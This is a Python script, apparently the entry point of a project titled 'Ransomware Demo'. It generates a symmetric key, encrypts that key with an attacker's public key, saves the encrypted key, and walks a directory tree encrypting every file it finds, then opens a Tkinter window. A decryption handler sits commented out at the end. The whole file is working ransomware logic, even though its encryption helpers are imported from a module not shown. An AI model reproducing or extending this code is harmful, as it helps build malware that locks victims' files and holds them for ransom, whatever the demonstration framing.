import argparse
import os
from cryptography.fernet import Fernet
from core import encrypt_symmetric_key, find_files, encrypt_file, decrypt_file, load_key_from_file
from tkinter import *

if __name__ == "__main__":

    # parse cli flags
    parser = argparse.ArgumentParser(description="public-key")
    parser.add_argument(
        "--pub",
        dest="public_key_file",
        default="attacker/public_key.pem",
        help="the public key to encrypt the sym key with"
    )
    parser.add_argument(
        "--path",
        dest="os_root_path",
        default="os_root",
        help="""the directory to start encrypting from, can be changed to a
        specific folder to run on that folder only"""
    )
    parser.add_argument(
        "--enc-sym-key",
        dest="enc_sym_key",
        default="./",
        help="the location to save the encrypted sym key"
    )
    args = parser.parse_args()
    public_key_file = args.public_key_file
    os_root_path = args.os_root_path
    key = args.enc_sym_key + "key"

    # check if the key already exists, if it does then don't encrypt again
    if not os.path.exists(key):

        # generate the sym key
        key = Fernet.generate_key()

        # encrypt the sym key with public key
        encrypted_key = encrypt_symmetric_key(
            key,
            public_key_filepath=public_key_file
        )

        # save the encrypted sym key
        with open("key", 'wb') as f:
            f.write(encrypted_key)

        # find all files and encrypt them
        files = find_files(os_root_path)
        for file in files:
            print(f"encrypted {file}")
            encrypt_file(file, key)

    # show gui
    window = Tk()
    window.title("Ransomware Demo")
    window.mainloop()

    # def handleButtonPress(key):
    #     # load the key
    #     print("Value from text box:", key)
    #     l_key = key

    #     # decrypt all files that were encrypted
    #     files = find_files(os_root_path)
    #     for file in files:
    #         print(f"decrypted {file}")
    #         decrypt_file(file, l_key)
